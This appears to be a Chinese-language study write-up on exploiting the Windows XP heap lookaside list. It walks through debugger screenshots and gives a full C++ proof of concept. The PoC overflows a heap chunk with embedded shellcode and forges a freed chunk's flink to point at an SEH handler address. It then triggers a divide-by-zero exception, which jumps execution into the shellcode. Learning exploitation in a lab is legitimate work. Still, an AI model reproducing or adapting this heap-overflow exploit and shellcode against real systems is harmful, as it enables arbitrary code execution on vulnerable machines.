###   攻擊快表也是蠻簡單的。

###  溫馨提示:占用態的堆 flink blink 也會變成 data 的一部分


###  這邊指出快表過程分析圖。

### 正常快表
![enter image description here](https://i.imgur.com/qP2KTx9.jpg)


###  d 想加入

![enter image description here](https://i.imgur.com/puqtVln.jpg)


###  加入完成，新加入的都排在lookaside 後面
![enter image description here](https://i.imgur.com/xXO3WYq.jpg)

----

###  用戶申請後，快表會優先拆除新加入的

![enter image description here](https://i.imgur.com/B0AwoBW.jpg)

###  拆除OK
![enter image description here](https://i.imgur.com/BYTSrkU.jpg)


###  POC .cpp
```
#include <string.h>
#include <stdio.h>
#include <windows.h>

void main()
{
	char shellcode[] = 

    // short jmp
    "\xeb\x26"

    // 14 nops                             
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	//total 16 bytes 剛好  h1 填滿 



    // just work like chunk-header   h2 頭
    "\x03\x00\x03\x00\x5c\x01\x08\x99"

    // exception handler      h2的 flink 
    "\xe4\xff\x12\x00"

    // 12 nops        h2的 data 
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"

    // 168 
    "\xfc\x68\x6a\x0a\x38\x1e\x68\x63\x89\xd1\x4f\x68\x32\x74\x91\x0c"
    "\x8b\xf4\x8d\x7e\xf4\x33\xdb\xb7\x04\x2b\xe3\x66\xbb\x33\x32\x53"
    "\x68\x75\x73\x65\x72\x54\x33\xd2\x64\x8b\x5a\x30\x8b\x4b\x0c\x8b"
    "\x49\x1c\x8b\x09\x8b\x69\x08\xad\x3d\x6a\x0a\x38\x1e\x75\x05\x95"
    "\xff\x57\xf8\x95\x60\x8b\x45\x3c\x8b\x4c\x05\x78\x03\xcd\x8b\x59"
    "\x20\x03\xdd\x33\xff\x47\x8b\x34\xbb\x03\xf5\x99\x0f\xbe\x06\x3a"
    "\xc4\x74\x08\xc1\xca\x07\x03\xd0\x46\xeb\xf1\x3b\x54\x24\x1c\x75"
    "\xe4\x8b\x59\x24\x03\xdd\x66\x8b\x3c\x7b\x8b\x59\x1c\x03\xdd\x03"
    "\x2c\xbb\x95\x5f\xab\x57\x61\x3d\x6a\x0a\x38\x1e\x75\xa9\x33\xdb"
    "\x53\x68\x2d\x6a\x6f\x62\x68\x67\x6f\x6f\x64\x8b\xc4\x53\x50\x50"
    "\x53\xff\x57\xfc\x53\xff\x57\xf8";

    
 
	


	int zero = 0;
    HLOCAL h1, h2, h3;
    HANDLE hp;
    hp = HeapCreate(0, 0, 0);
    //__asm int 3
    h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 0x10);
	//__asm int 3
    h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 0x10);
	//__asm int 3
    h3 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 0x10);
	//__asm int 3

    HeapFree(hp, 0, h3);
    HeapFree(hp, 0, h2);
	//__asm int 3

    memcpy(h1, shellcode, 300);

    h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 0x10);
    h3 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 0x10);
    memcpy(h3, "\x90\x1e\x3a\x00", 4); // 0x003a1e90 is h1 address

    
    zero = 1 / zero;
    printf("%d", zero);
}
```
###   在釋放完 h3 h2 後 過程分析圖


###  h3 先被釋放，所以先被加入
![enter image description here](https://i.imgur.com/yWIO9qf.jpg)


###  h2 也被釋放想加入
![enter image description here](https://i.imgur.com/cmB7WHq.jpg)


###  h2 加入完成

![enter image description here](https://i.imgur.com/AatGATv.jpg)



###  偽造h2 的 flink 值
![enter image description here](https://i.imgur.com/TaIsKcW.jpg)


###  用戶又申請了，所以最靠近快表的最優先被拆除。
### h2 這個位置被拿去給用戶使用了  
###  lookaside 的flink 也被修改了，因此h3 已經像是沒人要的孤兒()

![enter image description here](https://i.imgur.com/OcqkAf5.jpg)


###  用戶又申請了空間，所以lookaside 找到了最靠近的下一個節點 0012FFE4 

![enter image description here](https://i.imgur.com/qMXMRSY.jpg)


###  把未知數據複製給 lookaside 後，用戶申請到了 0012FFE4 的空間
![enter image description here](https://i.imgur.com/PyImrBB.jpg)


###  可以看到這些 lookaside  表上只剩下自己，h3 跟這些操作沒辦點關係。
![enter image description here](https://i.imgur.com/Zsu4xaD.jpg)


###  總之那個POC 最後用戶拿到的可以用的位置是 0012FFE4 ，我們在這個位置上寫入了 h1的位置，而h1 是放置我們shellcode 的地方。



###   shellcode 最開始擺了一個短跳是為了跳過 h2 ，因為h2 還是被分配給用戶了上面的值不可預測。



###  最後如果是正常實驗環境下執行(登入檔 AeDebug設置)，會跳出錯誤框，你只有按下除錯才能成功執行 (OD 是 just in time debugger)

![enter image description here](https://i.imgur.com/oXNYgn8.png)



###  我找了一下資料，並且用乾淨的xp 來執行，是用預設的值，不論按下什麼都能成功執行
#### drwtsn 32 是windows 的預設

![enter image description here](https://i.imgur.com/MUvspWZ.png)

![enter image description here](https://i.imgur.com/GkYDASH.png)



##  最後的問題:
###  一般在stack 上攻擊 seh 都是直接執行 shellcode，但是 heap 的攻擊 通常要按下錯誤對話框的某個按鈕才會執行。(到底是為啥???)
